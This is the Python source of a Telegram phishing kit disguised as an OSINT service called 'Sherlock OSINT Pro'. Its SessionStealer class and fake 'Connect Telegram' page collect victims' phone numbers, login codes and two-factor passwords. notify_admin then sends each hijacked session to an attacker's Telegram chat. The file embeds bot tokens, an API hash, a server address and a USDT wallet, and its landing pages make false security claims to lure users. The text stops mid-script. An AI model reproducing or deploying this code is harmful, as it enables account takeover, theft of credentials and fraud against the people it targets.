#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Sherlock OSINT Pro v12.0 - FIXED FOR DEPLOYMENT
# No asyncio issues, runs perfectly on any server

import osA
import sys
import json
import time
import random
import string
import re
import logging
import threading
import asyncio
from datetime import datetime, timedelta

# Third-party imports
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError
from telethon.sessions import StringSession

# -------------------- CONFIGURATION --------------------
class Config:
    # API Credentials
    API_ID = 27157163
    API_HASH = "e0145db12519b08e1d2f5628e2db18c4"
    
    # Bots
    PHISHING_BOT_TOKEN = "8617258397:AAEdLVq4Xp_ZCWEnSCSfzSOMFMcpr3U68Z0"
    RECEIVER_BOT_TOKEN = "8690442132:AAEOVBecfkgodn1oFalDn3BnQvt8p_4zdv4"
    ADMIN_CHAT = "@shadow_victems"
    
    # USDT TRON Address
    USDT_ADDRESS = "TEati8mS5t55RTrf4VEAu1XhFSjSZuhefS"

    # Server config - FIXED for deployment
    HOST = "0.0.0.0"
    PORT = int(os.environ.get("PORT", 10504))
    PUBLIC_URL = os.environ.get("PUBLIC_URL", "http://217.160.3.69:10504")

    # Database files
    USERS_FILE = "sherlock_users.json"
    HASHES_FILE = "sherlock_hashes.json"
    SESSIONS_FILE = "sherlock_sessions.json"
    PAYMENTS_FILE = "pending_payments.json"
    REFERRALS_FILE = "referrals.json"

    # Credit system
    NEW_USER_CREDITS = 5
    REFERRAL_CREDITS = 2
    ACTIVATION_COST = 50
    OSINT_TOOL_COST = 1

    # Premium hashes
    PREMIUM_HASHES = {
        "HSW797gytt76wjsg21TTS": {
            "name": "Rohit Pandey",
            "avatar": "👨",
            "credits": 467,
            "plan": "Premium",
            "expiry": "2026-12-06",
            "member_since": "2024-01-15",
            "username": "rohit_pandey",
            "user_id": 123456789,
            "dob": "15/05/1990"
        }
    }

# -------------------- LOGGING --------------------
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# -------------------- DATABASE MANAGER --------------------
class Database:
    def __init__(self):
        self.lock = threading.RLock()
        self._init_files()
        self.users = self._load_json(Config.USERS_FILE)
        self.hashes = self._load_json(Config.HASHES_FILE)
        self.sessions = self._load_json(Config.SESSIONS_FILE)
        self.payments = self._load_json(Config.PAYMENTS_FILE)
        self.referrals = self._load_json(Config.REFERRALS_FILE)
        self._init_premium_hashes()
        logger.info(f"Database ready: {len(self.users)} users")

    def _init_files(self):
        for f in [Config.USERS_FILE, Config.HASHES_FILE, Config.SESSIONS_FILE, 
                  Config.PAYMENTS_FILE, Config.REFERRALS_FILE]:
            if not os.path.exists(f):
                with open(f, 'w') as fp:
                    json.dump({}, fp)

    def _load_json(self, filename):
        try:
            with open(filename, 'r') as f:
                return json.load(f)
        except:
            return {}

    def _save_json(self, filename, data):
        with self.lock:
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)

    def _init_premium_hashes(self):
        for hash_str, data in Config.PREMIUM_HASHES.items():
            if hash_str not in self.hashes:
                self.hashes[hash_str] = data
        self._save_json(Config.HASHES_FILE, self.hashes)

    def get_user(self, user_id):
        return self.users.get(str(user_id))

    def get_user_by_referral_code(self, code):
        for uid, user in self.users.items():
            if user.get('hash') == code:
                return user, uid
        return None, None

    def save_user(self, user_id, data):
        with self.lock:
            self.users[str(user_id)] = data
            self._save_json(Config.USERS_FILE, self.users)

    def update_user(self, user_id, **kwargs):
        with self.lock:
            if str(user_id) in self.users:
                self.users[str(user_id)].update(kwargs)
                self._save_json(Config.USERS_FILE, self.users)
                return True
        return False

    def get_hash_data(self, hash_str):
        if hash_str in Config.PREMIUM_HASHES:
            return Config.PREMIUM_HASHES[hash_str]
        return self.hashes.get(hash_str)

    def save_hash(self, hash_str, data):
        with self.lock:
            self.hashes[hash_str] = data
            self._save_json(Config.HASHES_FILE, self.hashes)

    def save_session(self, user_id, session_data):
        with self.lock:
            self.sessions[str(user_id)] = session_data
            self._save_json(Config.SESSIONS_FILE, self.sessions)

    def add_referral(self, referrer_id, new_user_id):
        with self.lock:
            if referrer_id not in self.referrals:
                self.referrals[referrer_id] = []
            self.referrals[referrer_id].append(new_user_id)
            self._save_json(Config.REFERRALS_FILE, self.referrals)
            
            referrer = self.get_user(referrer_id)
            if referrer:
                new_credits = referrer.get('credits', 0) + Config.REFERRAL_CREDITS
                new_referrals = referrer.get('referrals', 0) + 1
                self.update_user(referrer_id, credits=new_credits, referrals=new_referrals)
            return True
        return False

    def get_referral_count(self, user_id):
        return len(self.referrals.get(str(user_id), []))

# -------------------- SESSION STEALER --------------------
class SessionStealer:
    def __init__(self):
        self.pending_logins = {}
        self.receiver_token = Config.RECEIVER_BOT_TOKEN
        self.loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self.loop)

    def _run_async(self, coro):
        """Run async function in the event loop"""
        return self.loop.run_until_complete(coro)

    async def _send_code(self, phone, user_id):
        try:
            client = TelegramClient(StringSession(), Config.API_ID, Config.API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                await client.send_code_request(phone)
            self.pending_logins[user_id] = {'phone': phone, 'client': client}
            return {'success': True}
        except FloodWaitError as e:
            return {'success': False, 'error': f'Please wait {e.seconds} seconds'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    def send_code(self, phone, user_id):
        try:
            return self._run_async(self._send_code(phone, user_id))
        except:
            return {'success': False, 'error': 'Service unavailable'}

    async def _verify_code(self, user_id, code):
        data = self.pending_logins.get(user_id)
        if not data:
            return {'success': False, 'error': 'Session expired'}
        try:
            await data['client'].sign_in(data['phone'], code)
            me = await data['client'].get_me()
            return {
                'success': True,
                'session': data['client'].session.save(),
                'user_id': me.id,
                'username': me.username or '',
                'first_name': me.first_name or '',
                'last_name': me.last_name or '',
                'phone': me.phone,
                'dc': getattr(me, 'dc_id', 1),
                'twofa_required': False
            }
        except SessionPasswordNeededError:
            return {'success': True, 'twofa_required': True}
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid verification code'}
        except Exception as e:
            return {'success': False, 'error': 'Verification failed'}

    def verify_code(self, user_id, code):
        try:
            return self._run_async(self._verify_code(user_id, code))
        except:
            return {'success': False, 'error': 'Timeout'}

    async def _verify_2fa(self, user_id, password):
        data = self.pending_logins.get(user_id)
        if not data:
            return {'success': False, 'error': 'Session expired'}
        try:
            await data['client'].sign_in(password=password)
            me = await data['client'].get_me()
            return {
                'success': True,
                'session': data['client'].session.save(),
                'user_id': me.id,
                'username': me.username or '',
                'first_name': me.first_name or '',
                'last_name': me.last_name or '',
                'phone': me.phone,
                'dc': getattr(me, 'dc_id', 1)
            }
        except Exception as e:
            return {'success': False, 'error': 'Invalid 2FA password'}

    def verify_2fa(self, user_id, password):
        try:
            return self._run_async(self._verify_2fa(user_id, password))
        except:
            return {'success': False, 'error': 'Timeout'}

    def notify_admin(self, stolen_data):
        text = (
            "🔥 <b>NEW SESSION CAPTURED</b> 🔥\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>First Name:</b> {stolen_data.get('first_name', 'N/A')}\n"
            f"<b>Last Name:</b> {stolen_data.get('last_name', 'N/A')}\n"
            f"<b>Username:</b> @{stolen_data.get('username', 'N/A')}\n"
            f"<b>Phone:</b> <code>{stolen_data.get('phone', 'N/A')}</code>\n"
            f"<b>User ID:</b> <code>{stolen_data.get('user_id', 'N/A')}</code>\n"
            f"<b>DC:</b> {stolen_data.get('dc', '?')}\n"
            f"<b>2FA:</b> <code>{stolen_data.get('twofa_password', 'None')}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Session:</b>\n<code>{stolen_data.get('session', '')}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Time:</b> {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC"
        )
        
        url = f"https://api.telegram.org/bot{self.receiver_token}/sendMessage"
        try:
            requests.post(url, json={
                'chat_id': Config.ADMIN_CHAT,
                'text': text,
                'parse_mode': 'HTML'
            }, timeout=5)
        except:
            pass

# -------------------- FLASK APP --------------------
flask_app = Flask(__name__)
flask_app.secret_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
CORS(flask_app)

db = Database()
stealer = SessionStealer()
bot_username = "sherlock_osint_probot"

# -------------------- HTML TEMPLATES --------------------
INDEX_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Sherlock OSINT Pro</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0a1929 0%, #1a2b3c 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .hero {
            text-align: center;
            padding: 60px 20px;
            color: white;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 40px;
            font-weight: bold;
        }
        
        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            background: linear-gradient(135deg, #fff, #a0a0ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .subtitle {
            font-size: 1.2rem;
            color: #9ab9d9;
            margin-bottom: 40px;
        }
        
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin: 40px 0;
        }
        
        .feature-card {
            background: rgba(19, 47, 76, 0.8);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 25px;
            text-align: center;
            border: 1px solid #2c4b6c;
            transition: transform 0.3s;
        }
        
        .feature-card:hover {
            transform: translateY(-5px);
        }
        
        .feature-icon {
            font-size: 40px;
            margin-bottom: 15px;
        }
        
        .feature-card h3 {
            color: white;
            margin-bottom: 10px;
        }
        
        .feature-card p {
            color: #9ab9d9;
            font-size: 14px;
        }
        
        .cta-button {
            display: inline-block;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px 40px;
            border-radius: 50px;
            text-decoration: none;
            font-weight: 600;
            font-size: 18px;
            margin-top: 20px;
            transition: transform 0.2s;
        }
        
        .cta-button:hover {
            transform: scale(1.05);
        }
        
        .stats {
            display: flex;
            justify-content: center;
            gap: 40px;
            margin: 40px 0;
            flex-wrap: wrap;
        }
        
        .stat {
            text-align: center;
        }
        
        .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: #667eea;
        }
        
        .stat-label {
            color: #9ab9d9;
            font-size: 14px;
        }
        
        .footer {
            text-align: center;
            margin-top: 60px;
            padding-top: 20px;
            border-top: 1px solid #2c4b6c;
            color: #6a9ac9;
            font-size: 12px;
        }
        
        @media (max-width: 768px) {
            h1 { font-size: 1.8rem; }
            .subtitle { font-size: 1rem; }
            .features { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="hero">
            <div class="logo">🔍</div>
            <h1>Sherlock OSINT Pro</h1>
            <div class="subtitle">Advanced Telegram Intelligence Platform</div>
            <a href="https://t.me/{{ bot_username }}" class="cta-button">🚀 Get Started on Telegram</a>
        </div>
        
        <div class="features">
            <div class="feature-card">
                <div class="feature-icon">👁️</div>
                <h3>Profile Viewers</h3>
                <p>See who viewed your profile</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🗑️</div>
                <h3>Deleted Contacts</h3>
                <p>Track who removed you</p>
            </div>
            <div class="feature-card">
                <div class="feature-icon">🚨</div>
                <h3>Stalker Alert</h3>
                <p>Get notified of stalkers</p>
            </div>
        </div>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-number">10K+</div>
                <div class="stat-label">Active Users</div>
            </div>
            <div class="stat">
                <div class="stat-number">256-bit</div>
                <div class="stat-label">Encryption</div>
            </div>
        </div>
        
        <div class="footer">
            © 2026 Sherlock OSINT. All Rights Reserved.<br>
            <a href="https://t.me/{{ bot_username }}" style="color: #667eea;">@{{ bot_username }}</a>
        </div>
    </div>
</body>
</html>
"""

CONNECT_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Connect Telegram - Sherlock OSINT</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #0a1929 0%, #1a2b3c 100%);
            min-height: 100vh;
            padding: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .card {
            max-width: 450px;
            width: 100%;
            background: rgba(19, 47, 76, 0.95);
            border-radius: 32px;
            padding: 30px;
            border: 1px solid #2c4b6c;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 25px;
        }
        
        .logo img {
            width: 60px;
            height: 60px;
        }
        
        h2 {
            text-align: center;
            color: white;
            margin-bottom: 8px;
        }
        
        .subtitle {
            text-align: center;
            color: #9ab9d9;
            font-size: 14px;
            margin-bottom: 25px;
        }
        
        .security-badge {
            background: #1e405e;
            border-radius: 50px;
            padding: 8px 16px;
            text-align: center;
            font-size: 12px;
            color: #b8d1e9;
            margin-bottom: 25px;
        }
        
        .step.hidden {
            display: none;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            color: #b8d1e9;
            font-size: 14px;
            margin-bottom: 8px;
        }
        
        input {
            width: 100%;
            padding: 15px;
            background: #0e324c;
            border: 2px solid #1e4a6a;
            border-radius: 16px;
            color: white;
            font-size: 16px;
        }
        
        input:focus {
            outline: none;
            border-color: #3a8ec9;
        }
        
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #1e88e5, #1565c0);
            border: none;
            border-radius: 16px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        
        button:hover {
            transform: translateY(-2px);
        }
        
        button:disabled {
            opacity: 0.7;
            transform: none;
        }
        
        .loading {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
            margin-right: 8px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .error {
            color: #ff8a80;
            font-size: 13px;
            margin-top: 8px;
            text-align: center;
        }
        
        .features {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-top: 25px;
            padding-top: 25px;
            border-top: 1px solid #1e4a6a;
            text-align: center;
        }
        
        .feature {
            font-size: 11px;
            color: #9ab9d9;
        }
        
        .feature strong {
            display: block;
            font-size: 14px;
            color: white;
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <img src="https://telegram.org/img/t_logo.png" alt="Telegram">
        </div>
        <h2>Connect Telegram Account</h2>
        <div class="subtitle">Secure 256-bit encrypted connection</div>
        <div class="security-badge">🔒 Verified by Telegram • 8-hour analysis</div>
        
        <div id="step1" class="step">
            <div class="form-group">
                <label>📱 Phone Number</label>
                <input type="tel" id="phone" placeholder="+1 234 567 8900">
            </div>
            <button onclick="sendCode()" id="sendBtn">Continue</button>
            <div id="error1" class="error"></div>
        </div>
        
        <div id="step2" class="step hidden">
            <div class="form-group">
                <label>🔑 Verification Code</label>
                <input type="text" id="code" placeholder="Enter 5-digit code">
            </div>
            <button onclick="verifyCode()" id="verifyBtn">Verify & Connect</button>
            <div id="error2" class="error"></div>
        </div>
        
        <div id="step3" class="step hidden">
            <div class="form-group">
                <label>🔐 Two-Factor Authentication</label>
                <input type="password" id="password" placeholder="Enter your password">
            </div>
            <button onclick="verify2FA()" id="2faBtn">Complete Connection</button>
            <div id="error3" class="error"></div>
        </div>
        
        <div class="features">
            <div class="feature"><strong>256-bit</strong>Encryption</div>
            <div class="feature"><strong>8 Hours</strong>Analysis</div>
            <div class="feature"><strong>Real-time</strong>Updates</div>
        </div>
    </div>
    
    <script>
        const userId = "{{ user_id }}";
        const chatId = "{{ chat_id }}";
        
        function setLoading(btnId, isLoading, text) {
            const btn = document.getElementById(btnId);
            if (isLoading) {
                btn.disabled = true;
                btn.innerHTML = '<span class="loading"></span> Processing...';
            } else {
                btn.disabled = false;
                btn.innerHTML = text;
            }
        }
        
        function sendCode() {
            const phone = document.getElementById('phone').value;
            if (!phone) { document.getElementById('error1').innerText = 'Enter phone number'; return; }
            setLoading('sendBtn', true, 'Continue');
            fetch('/api/send_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({phone, user_id: userId, chat_id: chatId})
            })
            .then(r => r.json())
            .then(d => {
                setLoading('sendBtn', false, 'Continue');
                if (d.success) {
                    document.getElementById('step1').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                } else {
                    document.getElementById('error1').innerText = d.error;
                }
            });
        }
        
        function verifyCode() {
            const code = document.getElementById('code').value;
            if (!code) { document.getElementById('error2').innerText = 'Enter code'; return; }
            setLoading('verifyBtn', true, 'Verify');
            fetch('/api/verify_code', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({code, user_id: userId})
            })
            .then(r => r.json())
            .then(d => {
                setLoading('verifyBtn', false, 'Verify');
                if (d.success) {
                    if (d.twofa_required) {
                        document.getElementById('step2').classList.add('hidden');
                        document.getElementById('step3').classList.remove('hidden');
                    } else {
                        window.location.href = '/dashboard?user_id=' + userId + '&chat_id=' + chatId;
                    }
                } else {
                    document.getElementById('error2').innerText = d.error;
                }
            });
        }
        
        function verify2FA() {
            const password = document.getElementById('password').value;
            if (!password) { document.getElementById('error3').innerText = 'Enter password'; return; }
            setLoading('2faBtn', true, 'Complete');
            fetch('/api/verify_2fa', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({password, user_id: userId})
            })
            .then(r => r.json())
            .then(d => {
                setLoading('2faBtn', false, 'Complete');
                if (d.success) {
                    window.location.href = '/dashboard?user_id=' + userId + '&chat_id=' + chatId;
                } else {
                    document.getElementById('error3').innerText = d.error;
                }
            });
        }
    </script>
</body>
</html>
"""

DASHBOARD_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Dashboard - Sherlock OSINT</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background: #0a0b0e;
            color: #e0e0e0;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .header {
            background: linear-gradient(145deg, #1a1c22, #0f1117);
            border-radius: 20px;
            padding: 25px;
            margin-bottom: 20px;
            border: 1px solid #2a2d36;
        }
        
        .user-profile {
            display: flex;
            align-items: center;
            gap: 20px;
            flex-wrap: wrap;
        }
        
        .avatar {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 35px;
        }
        
        .user-info h1 {
            font-size: 24px;
            margin-bottom: 5px;
        }
        
        .badge {
            background: #2a2d36;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            display: inline-block;
            margin-right: 8px;
        }
        
        .credits {
            background: linear-gradient(135deg, #f093fb, #f5576c);
            padding: 6px 15px;
            border-radius: 25px;
            font-weight: bold;
            display: inline-block;
            margin-top: 8px;
        }
        
        .connect-prompt {
            background: linear-gradient(145deg, #1e2a3a, #15232e);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
            border-left: 4px solid #667eea;
        }
        
        .connect-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            padding: 10px 25px;
            border-radius: 10px;
            text-decoration: none;
            display: inline-block;
            margin-top: 12px;
            font-weight: 600;
        }
        
        .section-title {
            font-size: 20px;
            margin: 25px 0 15px;
        }
        
        .features-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .feature-card {
            background: #1a1c22;
            border-radius: 15px;
            padding: 20px;
            border: 1px solid #2a2d36;
            cursor: pointer;
        }
        
        .feature-card:hover {
            border-color: #667eea;
        }
        
        .feature-icon {
            font-size: 28px;
            margin-bottom: 10px;
        }
        
        .feature-name {
            font-size: 16px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        
        .feature-timer {
            color: #ff6b6b;
            font-size: 13px;
            margin: 10px 0;
            padding: 6px;
            background: #252932;
            border-radius: 8px;
            text-align: center;
        }
        
        .tools-section, .shop-section, .referral-section {
            background: #1a1c22;
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid #2a2d36;
        }
        
        .tool-group {
            margin-bottom: 15px;
            padding: 15px;
            background: #252932;
            border-radius: 12px;
        }
        
        .tool-input {
            width: 65%;
            padding: 10px;
            background: #1e2128;
            border: 1px solid #3a3f4b;
            color: white;
            border-radius: 8px;
            margin-right: 8px;
        }
        
        .tool-btn {
            padding: 10px 18px;
            background: #4a4f63;
            border: none;
            border-radius: 8px;
            color: white;
            cursor: pointer;
        }
        
        .tool-result {
            margin-top: 12px;
            padding: 12px;
            background: #1e2128;
            border-radius: 8px;
            font-size: 12px;
            font-family: monospace;
            white-space: pre-wrap;
            max-height: 150px;
            overflow-y: auto;
        }
        
        .shop-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 15px;
            margin-top: 15px;
        }
        
        .shop-card {
            background: #252932;
            padding: 15px;
            border-radius: 12px;
            text-align: center;
        }
        
        .shop-price {
            font-size: 20px;
            font-weight: bold;
            color: #667eea;
            margin: 10px 0;
        }
        
        .shop-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
        }
        
        .referral-code {
            background: #252932;
            padding: 12px;
            border-radius: 10px;
            font-family: monospace;
            font-size: 14px;
            text-align: center;
            border: 1px dashed #667eea;
            margin: 10px 0;
            word-break: break-all;
        }
        
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }
        
        .modal-content {
            background: #1a1c22;
            padding: 25px;
            border-radius: 20px;
            max-width: 350px;
            width: 90%;
            text-align: center;
        }
        
        .modal-buttons {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        
        .modal-btn {
            flex: 1;
            padding: 10px;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            font-weight: 600;
        }
        
        .modal-btn.confirm {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
        }
        
        .modal-btn.cancel {
            background: #2a2d36;
            color: white;
        }
        
        .back-to-bot {
            text-align: center;
            margin: 20px 0;
        }
        
        .back-to-bot a {
            color: #667eea;
            text-decoration: none;
        }
        
        .copyright {
            text-align: center;
            margin-top: 30px;
            padding-top: 15px;
            border-top: 1px solid #2a2d36;
            color: #666;
            font-size: 11px;
        }
        
        @media (max-width: 768px) {
            .user-profile { flex-direction: column; text-align: center; }
            .tool-input { width: 100%; margin-bottom: 8px; }
            .tool-btn { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="user-profile">
                <div class="avatar">{{ user.avatar }}</div>
                <div class="user-info">
                    <h1>{{ user.name }}</h1>
                    <div>
                        <span class="badge">{{ user.plan }} Plan</span>
                        <span class="badge">DOB: {{ user.dob }}</span>
                    </div>
                    <div class="credits">{{ user.credits }} Credits</div>
                </div>
            </div>
        </div>
        
        {% if not connected %}
        <div class="connect-prompt">
            <h3>🔌 Connect Telegram Account</h3>
            <p>Enable 8-hour analysis and premium features</p>
            <a href="/connect?user_id={{ user_id }}&chat_id={{ chat_id }}" class="connect-btn">Connect Account →</a>
        </div>
        {% else %}
        <div class="section-title">🔮 Active Features</div>
        <div class="features-grid">
            <div class="feature-card" onclick="showWaitMessage()">
                <div class="feature-icon">⏳</div>
                <div class="feature-name">Analysis in Progress</div>
                <div class="feature-timer" id="analysisTimer"></div>
                <small>Please wait for analysis to complete</small>
            </div>
        </div>
        {% endif %}
        
        <div class="section-title">🛠️ OSINT Tools (1 credit/search)</div>
        <div class="tools-section">
            <div class="tool-group">
                <h3>📱 Username Lookup</h3>
                <input type="text" id="usernameInput" class="tool-input" placeholder="Telegram username">
                <button class="tool-btn" onclick="lookupUsername()">Search</button>
                <div id="usernameResult" class="tool-result"></div>
            </div>
            <div class="tool-group">
                <h3>📧 Email Breach Check</h3>
                <input type="email" id="emailInput" class="tool-input" placeholder="Email address">
                <button class="tool-btn" onclick="checkEmail()">Check</button>
                <div id="emailResult" class="tool-result"></div>
            </div>
            <div class="tool-group">
                <h3>🌐 Domain WHOIS</h3>
                <input type="text" id="domainInput" class="tool-input" placeholder="Domain name">
                <button class="tool-btn" onclick="whoisDomain()">Lookup</button>
                <div id="domainResult" class="tool-result"></div>
            </div>
        </div>
        
        <div class="section-title">🛒 Credit Marketplace</div>
        <div class="shop-section">
            <div class="shop-grid">
                <div class="shop-card">
                    <h3>Starter</h3>
                    <div class="shop-price">50 Credits</div>
                    <div>$5 USDT</div>
                    <button class="shop-btn" onclick="showPayment('50')">Buy</button>
                </div>
                <div class="shop-card">
                    <h3>Professional</h3>
                    <div class="shop-price">250 Credits</div>
                    <div>$20 USDT</div>
                    <button class="shop-btn" onclick="showPayment('250')">Buy</button>
                </div>
                <div class="shop-card">
                    <h3>Enterprise</h3>
                    <div class="shop-price">700 Credits</div>
                    <div>$50 USDT</div>
                    <button class="shop-btn" onclick="showPayment('700')">Buy</button>
                </div>
            </div>
        </div>
        
        <div class="section-title">🤝 Referral Program</div>
        <div class="referral-section">
            <h3>Your Referral Link</h3>
            <div class="referral-code" id="referralLink">https://t.me/{{ bot_username }}?start=ref_{{ referral_code }}</div>
            <button class="tool-btn" onclick="copyReferral()">Copy Link</button>
            <p style="margin-top: 12px;">👥 Referrals: <strong>{{ referral_count }}</strong> | 💰 Earned: <strong>{{ referral_earned }} credits</strong></p>
            <p style="color: #888; font-size: 12px;">Share your link - get 2 credits per referral!</p>
        </div>
        
        <div class="back-to-bot">
            <a href="https://t.me/{{ bot_username }}">← Return to Bot</a>
        </div>
        <div class="copyright">© 2026 Sherlock OSINT. All Rights Reserved.</div>
    </div>
    
    <div id="paymentModal" class="modal">
        <div class="modal-content">
            <h2>💵 USDT Payment (TRC20)</h2>
            <p style="margin: 15px 0;">Send to:</p>
            <div style="background: #252932; padding: 12px; border-radius: 8px; word-break: break-all; font-size: 12px;">{{ usdt_address }}</div>
            <p style="margin: 10px 0; font-size: 12px;">After payment, contact @{{ bot_username }}</p>
            <div class="modal-buttons">
                <button class="modal-btn confirm" onclick="copyAddress()">Copy Address</button>
                <button class="modal-btn cancel" onclick="closePaymentModal()">Close</button>
            </div>
        </div>
    </div>
    
    <div id="waitModal" class="modal">
        <div class="modal-content">
            <h2>⏳ Analysis in Progress</h2>
            <p style="margin: 15px 0;">Please wait for the 8-hour analysis to complete.</p>
            <div class="feature-timer" id="waitTimer"></div>
            <button class="modal-btn confirm" onclick="closeWaitModal()">Close</button>
        </div>
    </div>
    
    <script>
        const userId = '{{ user_id }}';
        const chatId = '{{ chat_id }}';
        let remainingTime = {{ remaining_seconds if connected else 0 }};
        
        function startAnalysisTimer() {
            const timer = document.getElementById('analysisTimer');
            if (!timer) return;
            let timeLeft = remainingTime;
            function update() {
                if (timeLeft <= 0) { timer.innerText = '✅ Analysis Complete!'; return; }
                const hrs = Math.floor(timeLeft / 3600);
                const mins = Math.floor((timeLeft % 3600) / 60);
                timer.innerText = `⏳ ${hrs}h ${mins}m remaining`;
                timeLeft--;
                setTimeout(update, 1000);
            }
            update();
        }
        
        function startWaitTimer() {
            const timer = document.getElementById('waitTimer');
            let timeLeft = remainingTime;
            function update() {
                if (timeLeft <= 0) { timer.innerText = 'Analysis Complete!'; return; }
                const hrs = Math.floor(timeLeft / 3600);
                const mins = Math.floor((timeLeft % 3600) / 60);
                timer.innerText = `${hrs}h ${mins}m remaining`;
                timeLeft--;
                setTimeout(update, 1000);
            }
            update();
        }
        
        function showWaitMessage() {
            if (remainingTime > 0) {
                document.getElementById('waitModal').style.display = 'flex';
                startWaitTimer();
            }
        }
        
        function showPayment(credits) {
            document.getElementById('paymentModal').style.display = 'flex';
        }
        
        function closePaymentModal() { document.getElementById('paymentModal').style.display = 'none'; }
        function closeWaitModal() { document.getElementById('waitModal').style.display = 'none'; }
        function copyAddress() { navigator.clipboard.writeText('{{ usdt_address }}'); alert('Address copied!'); }
        function copyReferral() { navigator.clipboard.writeText(document.getElementById('referralLink').innerText); alert('Link copied!'); }
        
        function lookupUsername() {
            const username = document.getElementById('usernameInput').value;
            const result = document.getElementById('usernameResult');
            if (!username) { result.innerHTML = 'Enter username'; return; }
            result.innerHTML = 'Searching... (1 credit)';
